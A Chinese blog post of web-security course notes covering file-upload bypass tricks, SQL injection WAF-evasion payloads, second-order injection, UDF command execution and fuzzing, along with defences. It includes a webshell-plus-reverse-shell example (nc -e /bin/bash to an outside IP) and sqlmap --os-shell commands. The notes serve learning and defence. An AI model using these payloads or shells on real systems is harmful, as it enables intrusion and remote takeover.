---
layout:       post
title:        "极客时间Web安全笔记"
subtitle:     "null"
date:         2020-10-27 02:42:09
author:       "NeptLiang"
header-img:   "img/home-bg.jpg"
header-mask:  0.3
catalog:      true
multilingual: false
tags:
    - WebSec
---


# 12. 文件上传初阶：后缀名绕过 & 原理探究

apache的php模块配置文件中：

```xml
<FilesMatch ".+\.ph(p[345]?|t|tml)$">
    SetHandler application/x-httpd-php
</FileMatch>
```

**php, php3, php4, php5, pht, phtml**后缀文件都会被当成php脚本解析

* *很多防火墙检测木马的时候针对特征检测，`eval`是很明显的特征*
* *常用到php中的`get_current_user`函数（获取当前用户名称）和`getcwd`函数（获取当前路径）*

---


# 13. 文件上传中阶：前端验证绕过、.htaccess绕过、大小写绕过

## 一、iis 5.x/6.0解析漏洞

1. **.asp结尾的目录**下的任意文件都解析成asp文件

    **例**：domain/xx.asp/xx.jpg

2. 服务器默认不解析**分号以后**的内容

    **例**：domain/xx.asp;.jpg

windows下iis 5.x/6.0调用asp.dll解析文件，代码不够完善

## 二、nginx解析漏洞
**低版本**nginx中，url中有**不存在的文件**时，php默认向前解析

**例**：domain/xxx.jpg/1.php，1.php不存在时，xxx.jpg解析成php文件

* *exploit database查询最新漏洞*

## 三、apache 1.x/2.x解析漏洞

从右往左判断后缀，**跳过不可识别的后缀**，直到找到可识别的后缀，按照该可识别后缀进行解析

**例**：访问上传的shell.php.test，服务器会解析成php文件

## 四、前端验证绕过

前端验证减轻服务器负担，但前端输入不可信，很容易绕过

1. **改包**
2. 浏览器**禁止/删除js代码**

## 五、.htaccess绕过

分布式配置文件，使web server配置可以随文件夹不同而不同

前提是web server启用了对它的支持

可绕过**黑名单**过滤

**例**（针对Apache）：

1. **上传.htaccess文件**，内容为`AddType application/x-httpd-php .test`（将test文件解析成php文件）
2. 上传xxx.test
3. 浏览器访问xxx.test

## 六、大小写绕过
win下文件名大小写不敏感，linux下开发者可能也会把web server配置成url大小写不敏感

针对黑名单

**.php->.pHp**

---


# 14. 文件上传高阶：文件流绕过、字符串截断绕过、文件头检测绕过

## 一、windows文件流特性绕过
ntfs实现了**多文件流**特性，日常写文件时写的就是默认数据流，也可以通过手动指定数据流的方式（`test.txt::$data`）把内容写到文件中

**例**：在cmd中执行

1. 
    ```cmd
    echo 111 > test.txt:111.txt
    ```
    创建文件test.txt，指明其文件流为111.txt，文件流内容为111（直接打开test.txt可看到文件内容为空，`notepad test.txt:111.txt`可打开文件流并看到文件流内容为111）
2. 
    ```cmd
    echo test > test.txt
    ```
    打印test到文件test.txt中
3. 
    ```cmd
    echo 222 > test.txt::$data
    ```
    在test.txt的默认文件流中输入222（打开test.txt可看到文件内容变为222）

通过输入文件流的方式，使创建的文件所解析的数据流不是我们写入的数据流实现绕过

### win平台文件流特性和php结合

默认数据流背后的数据会被认为是数据流写入到文件，可绕过文件类型检测

## 二、`%00`截断绕过
`%00`是字符串中或文件数据流中的**结束符**的url编码，属于编码绕过，可绕过**白名单**

### (1) 截断路径

**例**：代码采用白名单校验，只允许上传图片格式文件，不好绕过

但后面保存时，进行了路径拼接，而路径又是从前端获取的，故可以在路径进行截断，上传一个内容为一句话木马的jpg文件，并将`../upload/a.php%00`传给路径参数

### (2) 截断文件名

**条件**：
1. 文件类型**符合白名单策略**
2. 上传后是可执行或者说是服务器**可解析**的文件

**例**：`shell.png%00.jpg` -> `shell.png`
1. 在bp中拦包
2. 在文件后缀名前插一个空格或者别的字符
3. 切换到hex选项卡
4. 将插入的字符的十六进制值改成`00`
5. forward

## 三、文件头检测绕过

常见文件头格式：
```
PNG: 98 50 4E 47
JPG: FF D8 FF DB
GIF: 47 49 46 38
```

绕过**文件内容**检测

文件内容检测不可直接传马，故把php代码插在**图片文件后面**

程序解析器遇到图片内容中无法解析的字符可能会停止解析，故**建议把图片头部后面的内容去掉**

## 四、总结

**绕过类型**：
1. `Content-Type`绕过
2. 前端绕过
3. 文件解析规则绕过
4. Windows环境特性绕过
5. 大小写/双写/点空格/文件头/条件竞争绕过

**操作系统**本身特性、**web server**配置不合理等都可能导致漏洞

---


# 15. 文件上传：初探源码审计

无法直接利用文件上传时，可看看能否先上传内容包含一句话的jpg，然后**联合使用本地/远程文件包含**

* *php中`in_array`函数第三个参数值默认为`false`，即采用松散比较，故不指定第三个参数值时，`in_array(0, $纯字母的字符串数组)`返回`true`*

---


# 16. 文件上传：初探Fuzz

## Fuzz/模糊测试

自动或半自动生成大量随机数据输入程序，根据程序的反馈进行自动化或半自动化挖掘漏洞

**注意**：
1. 产生大量**异常输入**，可能造成生产环境崩溃
2. 产生大量**负载**，可能影响生产环境运行
3. 容易触发**安全警报**，为后续安全检测制造障碍。生产环境渗透和安全检测过程中不推荐fuzz，一般用于非生产环境或业务系统上线前

**例**：文件上传中用bp来fuzz文件后缀名

在intruder模块用web server能解析的文件名字典对文件后缀名进行遍历，来看有没有能绕过过滤的后缀名，如用php3、php5等后缀字典来fuzz文件后缀名

**结果判断**：服务器响应、WAF拦截、报错会返回各种状态码，可尝试通过**状态码**筛选正确的payload，或尝试根据**响应长度**或**匹配关键词**判断

## 文件上传防御措施
1. **文件类型**检测（白名单优于黑名单）
2. 使用**安全的函数**
3. 熟悉业务部署环境的**操作系统**、**web server配置**

---


# 22. SQL注入实战：判断SQL注入点&防御方式

*TIPS:带参数的动态网页且该网页访问了数据库，就有可能存在SQL注入*

## 一、注入点判断：单引号判断法

字符型整型都可

* *靶机：sqli-labs, xforburp.com, bwapp*

* *注不出数据的时候可尝试加`%`应对LIKE查询*

## 二、防御

### (1) 减少错误信息反馈
### (2) 对输入的特殊符号进行转义（黑名单机制）

符号|符号|符号|符号|符号|符号|符号
----|----|----|----|----|----|----
`\x00`	|	`\n`	|`\r`	|`\`	|`'`	|`"`	|`\x1a`

### (3) 对输入的特殊词组进行过滤（黑名单机制）（PHP的`mysql_escape_string`）

词组|词组|词组|词组|词组
----|----|----|----|----
`and` |`or` |`union` |`select` |空格

---


# 34 SQL注入实战：如何绕过WAF之混淆注入原理

大小写绕过

* *字段名也不是大小写敏感的*

---


# 35 SQL注入实战：如何绕过WAF之`union`、`where`、`limit`过滤绕过

## 一、`&&`和`||`绕过

用`&&`和`||`替代`and`和`or`

## 二、`union`过滤绕过

原来的 
```sql
union select user, password from users
```

替换成 
```sql
|| (select user from users where user_id=1) = 'admin'
```

这里`||`的使用类似于布尔盲注

## 三、`where`过滤绕过

原来的 
```sql
|| (select user from users where user_id=1) = 'admin'
```
替换成 
```sql
|| (select user from users limit 1,1) = 'admin'
```

通过`limit`筛选数据

## 四、`limit`过滤绕过

原来的 
```sql
|| (select user from users limit 1,1) = 'admin'
```

替换成 
```sql
|| (select min(user) from group by user_id having user_id=1) = 'admin'
```

通过`having`选择`group`并通过`min`从中取出单个user

---


# 36 SQL注入实战：如何绕过WAF之`group by`、`select`、单引号、`hex`、`unhex`、`substr`绕过

## 一、`group by`过滤绕过
原来的 
```sql
|| (select min(user from group by user_id having user_id=1) 'admin'
```

替换成 
```sql
|| select substr((select group_concat(name)name from test), 1, 1) = 't'
```

`group_concat`把整列数据连接起来然后`substr`逐字符判断

* *查询语句的输出作函数参数时记得把语句括起来*

## 二、`select`及单引号过滤绕过

原来的 
```sql
|| select substr((select group_concat(name)name from test), 1, 1) = 't'
```

替换成 
```sql
|| substr(name, 1, 1)=0x74
```
或 
```sql
|| substr(name, 1, 1)=unhex(74)
```

这里`||`的使用类似于布尔盲注，使用时可以**不要`select`**；

用**十六进制值**逐个字符进行判断就不需要引号了

## 三、`hex`、`unhex`及`substr`过滤绕过——`binary`

原来的 
```sql
|| substr(name, 1, 1) = unhex(74)
```

替换成 
```sql
|| binary(name) = 0x74657374
```

`binary`返回数据的十六进制值

---


# 37 SQL注入实战：如何绕过WAF之空格、等号、双写、双重编码绕过

## 一、空格过滤绕过

```sql
select/**/name/**/from/**/test;
```

或通过**URL编码**绕过WAF

## 二、等号过滤绕过

使用`like`关键字代替等号

## 三、双写绕过

## 四、双重编码绕过

有些WAF只解析一次URL编码后过滤，如果**编码两次**的话就可能会绕过WAF，并被后端执行

## 五、转义函数也不是万能的

## 六、总的来说，分为以下几种方式

1. SQL语句的同义变形体
2. 利用WAF规则设定的缺陷（如双写）
3. 利用技术链中间环节绕过（如编码）

---


# 38. SQL注入实战：如何绕过WAF之数据库底层编码注入

绕过转义函数（**宽字节注入**）

sqli-labs 36题

PHP中`mysql_query("SET NAMES gbk")`设置后端采取GBK编码

与这三句话效果等同：
```sql
SET character_set_client = x;
SET character_set_results = x;
SET character_set_results = x;
```

`SET`是动态设置参数，也可以通过my.ini/cnf进行静态设置

GBK（GB扩）兼容并拓展了GB2312

url编码：

编码 | 字符
-----|-----
`%27`	|	`'`  
`%23`	|	`#`  
`%df`	|	无意义  
`%5c`	|	`\`

`%df`和转义函数插入的表示反斜杠的`%5c`结合成一个“`運`”字，后面的单引号就不会被反斜杠转义了

---


# 39. SQL注入实战：如何绕过WAF之二次注入

**来自数据库的输入也不可信**

sqli-labs 24题

WAF记录IP、浏览器时也可能产生

**例1**：
1. 账号注册输入`admin'#`
2. 防御机制：转义成`admin\'#`
3. 实际存储内容：`admin'#`
4. 修改密码等查询进行SQL语句调用
    ```sql
    where user='?' and password='?'
    ```
    变成
    ```sql
    where user='admin'#' and password='123'
    ```

输入的内容可能在后端拼接执行时被转义，却在存储时被反转义还原

登录时传到后端的用户名被PHP的`mysql_real_escape_string`函数转义，难以注入，但注册用户`admin'#`成功

修改密码时后端信任了从数据库取出的用户名，没有进行过滤，直接拼接成如下语句：

```sql
update users set password='456' where username='admin'#' and password='123';
```
发生了二次注入，直接修改了admin的密码为456

## 防御

1. 代码与数据分离：**预编译**（最推荐的方式，来自前后端的攻击皆可防御）
2. 禁止用户账号出现特殊符号，或转义

---


# 40. SQL注入实战：命令执行

## 一、写webshell

注意`into outfile`的联合查询的**列数**也要和原来的一致

**文件已存在**的话再写会报错

`Errcode: 13`意为mysql用户没有该目录的**权限**

## 二、UDF

UDF文件获取：

* [github.com/mysqludf/lib_mysqludf_sys](github.com/mysqludf/lib_mysqludf_sys)

* sqlmap/data/udf/mysql/

sqlmap下的文件经过编码，需要使用sqlmap/extra/cloak目录下的cloak.py进行解码

```sh
python cloak.py -d -i /Users/apple/workplace/sqlmap/data/udf/mysql/linux/64/lib_mysqludf_sys.so_ -o lib_linux.so
```

---


# 41. SQL注入实战：webshell类型命令执行与交互

## 反弹shell

### 客户端：

```sh
nc -l 8888
```

**监听**8888端口

### 服务端：

1. `into outfile`写入一句话`system($_GET['cmd']`到images/cmd.php
2. 在浏览器访问domain/images/cmd/php?cmd=nc -e /bin/bash 192.168.0.98 333，使服务器**连接**客户端192.168.0.98的端口333，连接成功后执行`/bin/bash`

---


# 42. SQL注入实战：UDF类型命令执行与交互

## UDF

```sql
select unhex('UDF库文件二进制内容的十六进制') into dumpfile '/usr/lib/mysql/plugin/lib_linux.so'
```

要有**写文件权限**

* `into outfile`会在行末写入新行、转义换行符，二进制可执行文件内容会被破坏
* `into dumpfile` 不对任何列或行进行终止、不执行任何转义，能导出完整可执行的二进制文件

故写udf库这种二进制可执行文件要用`dumpfile`

写入UDF库文件后，创建函数：

```sql
create functon sys_eval returns string soname "lib_linux.so"
```

SQLMap提供参数进行命令执行和shell获取

```sh
sqlmap.py -u "url" --os-shell
sqlmap.py -u "url" --os-cmd=ipconfig
```

## SQL注入命令执行防御

除了对**SQL注入本身**的检测之外：
1. 服务器**文件夹**的权限管理
2. 以最小权限应用**服务**，如apache服务

---


# 50. SQL注入实战：自动化注入之FuzzDB+Burp组合拳

**fuzzdb**：github上的开源应用程序模糊测试数据库，包含各种payload

包含命令执行、目录遍历、文件上传绕过、xss、sql注入等，还有webshell、字典

bp爆破模式：
* sniper：狙击手，使用单一词典，每次仅变更一个参数。如有两参数，先保持第二个参数不变、遍历第一个参数，然后保存第一个参数不变、遍历第二个参数
* 攻城锤：使用单一词典，多个变量同时变更为同一值
* 音叉：每个变量一个词典，三个变量同时改变
* 集束炸弹：笛卡尔积，每个变量与另一个变量所有情况的组合都测试到，多个字典情况下测试时间非常漫长


> ***`//End of Article`***


![公众号二维码](https://neptliang.github.io/img/Article/WeChatBlog.png)